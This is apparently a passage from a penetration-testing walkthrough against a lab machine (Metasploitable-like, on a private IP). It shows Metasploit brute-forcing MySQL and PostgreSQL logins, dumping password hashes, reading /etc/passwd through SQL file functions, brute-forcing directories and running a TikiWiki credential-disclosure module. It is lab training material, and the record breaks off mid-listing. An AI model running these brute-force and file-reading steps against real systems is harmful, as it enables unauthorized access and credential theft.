+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:shithead (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:shibboleth (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:shiatsu (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:shearer9 (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:shareef (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:shaolin (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:shaft (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:shadow (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:seymour (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:seven (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:semperfi (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sekhmet (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:seifer (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:security (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sebastian (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:se7en (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:scooter (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:scooby (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:schumacher (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:schiess (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sbbut (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:satire (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:satan (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sane (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sandman (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sanderson (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:samuel (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:same (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sambuca (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sadbuttrue (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sabina (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:s3cr3t (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:s1mpl3 (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:roze (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[!] No active DB -- Credential data will not be saved!
+[+] 192.168.174.130:3306 MYSQL - Success: 'root:root'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(mysql_login) > 
+
+In Terminal
+root@kali:~# mysql -h 192.168.174.130 -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 229
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| tikiwiki           |
+| tikiwiki195        |
++--------------------+
+4 rows in set (0.00 sec)
+
+mysql> use mysql
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| columns_priv              |
+| db                        |
+| func                      |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| proc                      |
+| procs_priv                |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| user                      |
++---------------------------+
+17 rows in set (0.01 sec)
+
+mysql> select User, Password from user;
++------------------+-------------------------------------------+
+| User             | Password                                  |
++------------------+-------------------------------------------+
+| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
+| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
+| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
+|                  |                                           |
+|                  |                                           |
+| debian-sys-maint | *E07F0A7CCC0044345116513C989F45663C1F8347 |
+| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
++------------------+-------------------------------------------+
+7 rows in set (0.00 sec)
+
+mysql> select load_file('/etc/passwd');
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| load_file('/etc/passwd')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+ |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.01 sec)
+
+mysql> 
+
+5.) Enumerating port 5432/tcp - postgresql - PostgreSQL DB 8.3.0 - 8.3.7
+In msf
+root@kali:~# msfconsole
+msf > search postgres
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                       Disclosure Date  Rank       Description
+   ----                                                       ---------------  ----       -----------
+   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal     Ruby on Rails Devise Authentication Password Reset
+   auxiliary/admin/postgres/postgres_readfile                                  normal     PostgreSQL Server Generic Query
+   auxiliary/admin/postgres/postgres_sql                                       normal     PostgreSQL Server Generic Query
+   auxiliary/analyze/jtr_postgres_fast                                         normal     John the Ripper Postgres SQL Password Cracker
+   auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal     PostgreSQL Database Name Command Line Flag Injection
+   auxiliary/scanner/postgres/postgres_hashdump                                normal     Postgres Password Hashdump
+   auxiliary/scanner/postgres/postgres_login                                   normal     PostgreSQL Login Utility
+   auxiliary/scanner/postgres/postgres_schemadump                              normal     Postgres Schema Dump
+   auxiliary/scanner/postgres/postgres_version                                 normal     PostgreSQL Version Probe
+   auxiliary/server/capture/postgresql                                         normal     Authentication Capture: PostgreSQL
+   exploit/linux/postgres/postgres_payload                    2007-06-05       excellent  PostgreSQL for Linux Payload Execution
+   exploit/multi/http/manage_engine_dc_pmp_sqli               2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   exploit/windows/postgres/postgres_payload                  2009-04-10       excellent  PostgreSQL for Microsoft Windows Payload Execution
+   post/linux/gather/enum_users_history                                        normal     Linux Gather User History
+
+
+msf > use auxiliary/scanner/postgres/postgres_login
+msf auxiliary(postgres_login) > show options 
+
+Module options (auxiliary/scanner/postgres/postgres_login):
+
+   Name              Current Setting                                                               Required  Description
+   ----              ---------------                                                               --------  -----------
+   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
+   DATABASE          template1                                                                     yes       The database to authenticate against
+   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
+   PASSWORD                                                                                        no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
+   RHOSTS                                                                                          yes       The target address range or CIDR identifier
+   RPORT             5432                                                                          yes       The target port
+   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                             yes       The number of concurrent threads
+   USERNAME          postgres                                                                      no        A specific username to authenticate as
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
+   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
+   VERBOSE           true                                                                          yes       Whether to print output for all attempts
+
+msf auxiliary(postgres_login) > set RHOSTS 192.168.174.130
+RHOSTS => 192.168.174.130
+msf auxiliary(postgres_login) > exploit 
+
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[!] No active DB -- Credential data will not be saved!
+[+] 192.168.174.130:5432 - LOGIN SUCCESSFUL: postgres:postgres@template1
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:5432 POSTGRES - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(postgres_login) > 
+
+In terminal
+root@kali:~# psql -h 192.168.174.130 -U postgres -W
+Password for user postgres: 
+psql (9.1.15, server 8.3.1)
+WARNING: psql version 9.1, server version 8.3.
+         Some psql features might not work.
+SSL connection (cipher: DHE-RSA-AES256-SHA, bits: 256)
+Type "help" for help.
+
+postgres=# select usename, passwd from pg_shadow;
+ usename  |               passwd                
+----------+-------------------------------------
+ postgres | md53175bce1d3201d16594cebf9d7eb3f9d
+(1 row)
+
+postgres=# select current_database();
+ current_database 
+------------------
+ postgres
+(1 row)
+
+postgres=# create table test1 (input TEXT); copy test1 from '/etc/passwd';select input from test1;
+CREATE TABLE
+COPY 35
+postgres=# 
+
+                                    input                                     
+------------------------------------------------------------------------------
+ root:x:0:0:root:/root:/bin/bash
+ daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+ bin:x:2:2:bin:/bin:/bin/sh
+ sys:x:3:3:sys:/dev:/bin/sh
+ sync:x:4:65534:sync:/bin:/bin/sync
+ games:x:5:60:games:/usr/games:/bin/sh
+ man:x:6:12:man:/var/cache/man:/bin/sh
+ lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+ mail:x:8:8:mail:/var/mail:/bin/sh
+ news:x:9:9:news:/var/spool/news:/bin/sh
+ uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+ proxy:x:13:13:proxy:/bin:/bin/sh
+ www-data:x:33:33:www-data:/var/www:/bin/sh
+ backup:x:34:34:backup:/var/backups:/bin/sh
+ list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+ irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+ nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+ libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+ dhcp:x:101:102::/nonexistent:/bin/false
+ syslog:x:102:103::/home/syslog:/bin/false
+ klog:x:103:104::/home/klog:/bin/false
+ sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+ msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+ bind:x:105:113::/var/cache/bind:/bin/false
+ postfix:x:106:115::/var/spool/postfix:/bin/false
+ ftp:x:107:65534::/home/ftp:/bin/false
+ postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+ mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+ tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+ distccd:x:111:65534::/:/bin/false
+ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+ service:x:1002:1002:,,,:/home/service:/bin/bash
+ telnetd:x:112:120::/nonexistent:/bin/false
+ proftpd:x:113:65534::/var/run/proftpd:/bin/false
+(35 rows)
+
+6.) Enumerating port - 80/tcp - http - Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+In Browser
+http://192.168.174.130/
+
+Dirbuster (http://192.168.174.130/) (directory-list-2.3-medium.txt)
+root@kali:~# dirbuster 
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+File found: /tikiwiki/about.php - 302
+File found: /tikiwiki/index.php - 302
+Dir found: /tikiwiki/images/ - 302
+Dir found: /tikiwiki/about/ - 302
+Dir found: /tikiwiki/img/ - 302
+Dir found: /tikiwiki/ - 302
+File found: /tikiwiki/comments.php - 200
+Dir found: /tikiwiki/templates/ - 302
+Dir found: /tikiwiki/index/ - 302
+Dir found: /tikiwiki/files/ - 302
+Dir found: /tikiwiki/help/ - 200
+Dir found: /tikiwiki/games/ - 302
+Dir found: /tikiwiki/modules/ - 302
+Dir found: /tikiwiki/images/index/ - 302
+File found: /tikiwiki/images/index.php - 302
+Dir found: /tikiwiki/img/index/ - 302
+Dir found: /tikiwiki/comments/ - 200
+File found: /tikiwiki/img/index.php - 302
+Dir found: /tikiwiki/templates/index/ - 302
+Dir found: /tikiwiki/img/icons/ - 302
+File found: /tikiwiki/files/index.php - 302
+Dir found: /tikiwiki/files/index/ - 302
+File found: /tikiwiki/templates/index.php - 302
+File found: /tikiwiki/img/icons/index.php - 302
+Dir found: /tikiwiki/img/icons/index/ - 302
+Dir found: /tikiwiki/doc/ - 302
+File found: /tikiwiki/help.php - 200
+Dir found: /tikiwiki/img/wiki/ - 302
+File found: /tikiwiki/modules/index.php - 302
+Dir found: /tikiwiki/modules/index/ - 302
+File found: /tikiwiki/games/index.php - 302
+Dir found: /tikiwiki/games/index/ - 302
+File found: /tikiwiki/img/wiki/index.php - 302
+Dir found: /tikiwiki/img/wiki/index/ - 302
+Dir found: / - 200
+Dir found: /tikiwiki/doc/index/ - 302
+File found: /tikiwiki/doc/index.php - 302
+Dir found: /tikiwiki/templates/modules/ - 302
+Dir found: /cgi-bin/ - 403
+Dir found: /tikiwiki/templates/mail/ - 302
+DirBuster Stopped
+
+In Browser
+http://192.168.174.130/tikiwiki/tiki-index.php
+
+https://www.exploit-db.com/exploits/2701/
+"/tiki-listpages.php?offset=0&sort_mode="
+http://192.168.174.130/tikiwiki/tiki-listpages.php?offset=0&sort_mode=
+"""
+["database"]=>
+        string(11) "tikiwiki195"
+        ["host"]=>
+        string(9) "localhost"
+        ["user"]=>
+        string(4) "root"
+        ["password"]=>
+        string(4) "root"
+"""
+
+In msf
+root@kali:~# msfconsole
+msf > search tikiwiki
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                             Disclosure Date  Rank       Description
+   ----                                             ---------------  ----       -----------
+   auxiliary/admin/tikiwiki/tikidblib               2006-11-01       normal     TikiWiki Information Disclosure
+   exploit/unix/webapp/php_xmlrpc_eval              2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution
+   exploit/unix/webapp/tikiwiki_graph_formula_exec  2007-10-10       excellent  TikiWiki tiki-graph_formula Remote PHP Code Execution
+   exploit/unix/webapp/tikiwiki_jhot_exec           2006-09-02       excellent  TikiWiki jhot Remote Command Execution
+   exploit/unix/webapp/tikiwiki_unserialize_exec    2012-07-04       excellent  Tiki Wiki unserialize() PHP Code Execution
+
+msf > use auxiliary/admin/tikiwiki/tikidblib
+msf auxiliary(tikidblib) > show options 
+
+Module options (auxiliary/admin/tikiwiki/tikidblib):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                     yes       The target address
+   RPORT    80               yes       The target port
+   URI      /tikiwiki        yes       TikiWiki directory path
+   VHOST                     no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name      Description
+   ----      -----------
+   Download  
+
+
+msf auxiliary(tikidblib) > set RHOST 192.168.174.130
+RHOST => 192.168.174.130
+msf auxiliary(tikidblib) > exploit 
+
+[*] Establishing a connection to the target...
+[*] Get informations about database...
+[*] Install path : /var/www/tikiwiki/lib/tikidblib.php
+[*] DB type      : mysql
+[*] DB name      : tikiwiki195
+[*] DB host      : localhost
+[*] DB user      : root
+[*] DB password  : root
+[*] Auxiliary module execution completed
+msf auxiliary(tikidblib) > 
+
+In mssql client
+root@kali:~# mysql -h 192.168.174.130 -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 1705
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| tikiwiki           |
+| tikiwiki195        |
++--------------------+
+4 rows in set (0.00 sec)
+
+mysql> use tikiwiki195
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++------------------------------------+
+| Tables_in_tikiwiki195              |
++------------------------------------+
+| galaxia_activities                 |
+| galaxia_activity_roles             |
+| galaxia_instance_activities        |
+| galaxia_instance_comments          |
+| galaxia_instances                  |
+| galaxia_processes                  |
+| galaxia_roles                      |
+| galaxia_transitions                |
+| galaxia_user_roles                 |
+| galaxia_workitems                  |
+| messu_archive                      |
+| messu_messages                     |
+| messu_sent                         |
+| sessions                           |
+| tiki_actionlog                     |
+| tiki_article_types                 |
+| tiki_articles                      |
+| tiki_banners                       |
+| tiki_banning                       |
+| tiki_banning_sections              |
+| tiki_blog_activity                 |
+| tiki_blog_posts                    |
+| tiki_blog_posts_images             |
+| tiki_blogs                         |
+| tiki_calendar_categories           |
+| tiki_calendar_items                |
+| tiki_calendar_locations            |
+| tiki_calendar_roles                |
+| tiki_calendars                     |
+| tiki_categories                    |
+| tiki_categorized_objects           |
+| tiki_category_objects              |
+| tiki_category_sites                |
+| tiki_chart_items                   |
+| tiki_charts                        |
+| tiki_charts_rankings               |
+| tiki_charts_votes                  |
+| tiki_chat_channels                 |
+| tiki_chat_messages                 |
+| tiki_chat_users                    |
+| tiki_comments                      |
+| tiki_content                       |
+| tiki_content_templates             |
+| tiki_content_templates_sections    |
+| tiki_cookies                       |
+| tiki_copyrights                    |
+| tiki_directory_categories          |
+| tiki_directory_search              |
+| tiki_directory_sites               |
+| tiki_download                      |
+| tiki_drawings                      |
+| tiki_dsn                           |
+| tiki_dynamic_variables             |
+| tiki_eph                           |
+| tiki_extwiki                       |
+| tiki_faq_questions                 |
+| tiki_faqs                          |
+| tiki_featured_links                |
+| tiki_file_galleries                |
+| tiki_file_handlers                 |
+| tiki_files                         |
+| tiki_forum_attachments             |
+| tiki_forum_reads                   |
+| tiki_forums                        |
+| tiki_forums_queue                  |
+| tiki_forums_reported               |
+| tiki_friends                       |
+| tiki_friendship_requests           |
+| tiki_galleries                     |
+| tiki_galleries_scales              |
+| tiki_games                         |
+| tiki_group_inclusion               |
+| tiki_history                       |
+| tiki_hotwords                      |
+| tiki_html_pages                    |
+| tiki_html_pages_dynamic_zones      |
+| tiki_images                        |
+| tiki_images_data                   |
+| tiki_integrator_reps               |
+| tiki_integrator_rules              |
+| tiki_language                      |
+| tiki_languages                     |
+| tiki_link_cache                    |
+| tiki_links                         |
+| tiki_live_support_events           |
+| tiki_live_support_message_comments |
+| tiki_live_support_messages         |
+| tiki_live_support_modules          |
+| tiki_live_support_operators        |
+| tiki_live_support_requests         |
+| tiki_logs                          |
+| tiki_mail_events                   |
+| tiki_mailin_accounts               |
+| tiki_menu_languages                |
+| tiki_menu_options                  |
+| tiki_menus                         |
+| tiki_minical_events                |
+| tiki_minical_topics                |
+| tiki_modules                       |
+| tiki_newsletter_groups             |
+| tiki_newsletter_subscriptions      |
+| tiki_newsletters                   |
+| tiki_newsreader_marks              |
+| tiki_newsreader_servers            |
+| tiki_object_ratings                |
